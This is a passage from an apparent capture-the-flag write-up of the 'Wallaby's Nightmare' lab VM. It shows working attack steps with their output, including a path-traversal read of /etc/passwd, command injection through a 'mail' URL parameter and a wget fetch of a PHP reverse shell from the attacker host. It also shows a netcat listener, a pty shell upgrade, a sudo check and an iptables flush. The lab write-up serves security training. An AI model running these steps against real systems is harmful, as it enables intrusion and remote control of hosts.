&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://192.168.56.101/?page=../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
walfin:x:1000:1000:walfin,,,:/home/walfin:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
steven?:x:1001:1001::/home/steven?:/bin/bash
ircd:x:1003:1003:,,,:/home/ircd:/bin/bash&lt;span class=&quot;c&quot;&gt;&amp;lt;!--This is what we call 'dis-information' in the cyber security world!  Are you learning anything new here bobby
?--&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, we have the &lt;b&gt;/etc/passwd&lt;/b&gt; file. But after trying to grab &lt;b&gt;/etc/shadow&lt;/b&gt;, website presented us with this nice info and connection was dropped. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;view-source:http://192.168.56.101/?page=../../../etc/shadow
&lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;That's some fishy stuff you're trying there &lt;span class=&quot;nt&quot;&gt;&amp;lt;em&amp;gt;&lt;/span&gt;bobby
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/em&amp;gt;&lt;/span&gt;buddy.  You must think Wallaby codes like a monkey!  I better get to securing this SQLi though...&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
         &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;(Wallaby caught you trying an LFI, you gotta be sneakier!  Difficulty level has increased.)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Doing the nmap scan showed us that the port 80 is no longer there. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap 192.168.56.101

Starting Nmap 7.40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-07-15 08:21 EDT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.101
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00019s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
6667/tcp filtered irc
MAC Address: 08:00:27:BC:E8:C6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1.46 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But another scan, with bigger port range, showed new http service, running on port &lt;b&gt;60080&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 192.168.56.101

Starting Nmap 7.40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-07-15 08:22 EDT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.101
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0055s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65532 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
6667/tcp  filtered irc
60080/tcp open     unknown
MAC Address: 08:00:27:BC:E8:C6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;5.15 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another website! &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/wallabys-nightmare/another-website.png&quot; alt=&quot;Port 60080 website&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Unfortunately there were no clues in the image, as I thought at first. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;http://192.168.56.101:60080/sec.png

root@kali:~/Downloads# exiftool index.png
ExifTool Version Number         : 10.40
File Name                       : index.png
Directory                       : &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
File Size                       : 56 kB
File Modification Date/Time     : 2017:07:15 08:24:56-04:00
File Access Date/Time           : 2017:07:15 08:25:17-04:00
File Inode Change Date/Time     : 2017:07:15 08:24:56-04:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 600
Image Height                    : 400
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Software                        : Adobe ImageReady
XMP Toolkit                     : Adobe XMP Core 5.0-c060 61.134777, 2010/02/12-17:32:00
Creator Tool                    : Adobe Photoshop CS5 Windows
Instance ID                     : xmp.iid:04130E655CDC11E08DFECD5B48C7E53A
Document ID                     : xmp.did:04130E665CDC11E08DFECD5B48C7E53A
Derived From Instance ID        : xmp.iid:04130E635CDC11E08DFECD5B48C7E53A
Derived From Document ID        : xmp.did:04130E645CDC11E08DFECD5B48C7E53A
Image Size                      : 600x400
Megapixels                      : 0.240&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If you don't know what to do, do a Nikto scan! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nikto &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 192.168.56.101:60080
- Nikto v2.1.6
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Target IP:          192.168.56.101
+ Target Hostname:    192.168.56.101
+ Target Port:        60080
+ Start Time:         2017-07-15 08:28:56 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Server: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
+ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Web Server returns a valid response with junk HTTP methods, this may cause &lt;span class=&quot;nb&quot;&gt;false &lt;/span&gt;positives.
+ /index.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;probably Rocket, but could be any index.php&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7537 requests: 0 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 7 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
+ End Time:           2017-07-15 08:29:23 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;27 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Hey, it's the same vulnerability as in the previous page. Let's exploit it once again. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://192.168.56.101:60080/index.php?page=index.php

&lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;Dude, &lt;span class=&quot;nt&quot;&gt;&amp;lt;em&amp;gt;&lt;/span&gt;bobby&lt;span class=&quot;nt&quot;&gt;&amp;lt;/em&amp;gt;&lt;/span&gt; what are you trying over here?!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I'm running a dirbuster! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# dirb http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; /usr/share/dirb/wordlists/big.txt

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
DIRB v2.22    
By The Dark Raver
&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

START_TIME: Sat Jul 15 08:36:59 2017
URL_BASE: http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

GENERATED WORDS: 20458                                                         

&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Scanning URL: http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+ http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;blacklist &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:992&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;              
+ http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;cgi-bin/ &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:898&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;               
+ http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;contact &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:895&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                
+ http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;home &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:1145&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                  
+ http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;index &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:1360&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                 
+ http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mailer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:1083&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
END_TIME: Sat Jul 15 08:37:24 2017
DOWNLOADED: 20458 - FOUND: 6&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We can now manually go through these pages to look for anything interesting. There's nothing in the contact...&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;http://192.168.56.101:60080/index.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;contact

Contact me with all your whining at wallaby@wallaby.wallaby.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But mailer, mailer is interesting. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://192.168.56.101:60080/index.php?page=mailer

&lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'color:blue;'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Coming Soon guys!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;&amp;lt;!--a href='/?page=mailer&amp;amp;mail=mail wallaby &quot;message goes here&quot;'&amp;gt;&amp;lt;button type='button'&amp;gt;Sendmail&amp;lt;/button--&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;&amp;lt;!--Better finish implementing this so bobby can send me all his loser complaints!--&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And by trial and error, I've found that it's even vulnerable to command injection. Let's check that! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://192.168.56.101:60080/?page=mailer&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;mail=uname%20-a
Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Our plan is to upload a &lt;b&gt;PHP Reverse Shell&lt;/b&gt; to the machine. Firstly, let's copy it, so then we can modify the code. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/web# cp /usr/share/webshells/php/php-reverse-shell.php ~/web&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;set_time_limit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$VERSION&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'192.168.56.102'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// CHANGE THIS
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1234&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// CHANGE THIS
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$chunk_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$write_a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$error_a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$shell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'uname -a; w; id; /bin/sh -i'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$daemon&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$debug&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now, we're ready to upload the file on Python SimpleHTTPServer. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/web# python &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And we can use &lt;b&gt;wget&lt;/b&gt; to download the shell on our victim machine. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mailer&amp;amp;mail&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;wget%20192.168.56.102:8000/shell.php
http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mailer&amp;amp;mail&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls

&lt;/span&gt;eye.jpg index.php s13!34g&lt;span class=&quot;nv&quot;&gt;$3FVA5e&lt;/span&gt;@ed sec.png shell.php uname.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now start the netcat listener and navigate to the shell.php file. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; 1234
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1234 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.102] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.101] 59808
Linux ubuntu 4.4.0-31-generic &lt;span class=&quot;c&quot;&gt;#50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
 08:07:00 up 53 min,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
waldo    pts/0    tmux&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;642&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.%0     07:13   53:39   0.64s  0.64s irssi
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
$ python -c '&lt;/span&gt;import pty&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pty.spawn&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'
www-data@ubuntu:/$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And we're connected! Running &lt;b&gt;sudo -l&lt;/b&gt; gives us information that we can run &lt;b&gt;iptables&lt;/b&gt; as &lt;b&gt;www-data&lt;/b&gt; and &lt;b&gt;vim&lt;/b&gt; with certain file as &lt;b&gt;waldo&lt;/b&gt; user. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@ubuntu:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;www-data on ubuntu:
    env_reset, mail_badpass,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin

User www-data may run the following commands on ubuntu:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;waldo&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/vim /etc/apache2/sites-available/000-default.conf
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /sbin/iptables&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Remember that &lt;b&gt;IRC&lt;/b&gt; port that came up during the first scan? It was filtered, so flushing the iptables may allow us to connect. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@ubuntu:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now, let's check that by running another nmap scan. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap 192.168.56.101

Starting Nmap 7.40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-07-15 11:32 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.101
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00017s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
6667/tcp open  irc
MAC Address: 08:00:27:BC:E8:C6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.29 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, it's open! Let's connect to it using &lt;b&gt;HexChat&lt;/b&gt;. &lt;/p&gt;

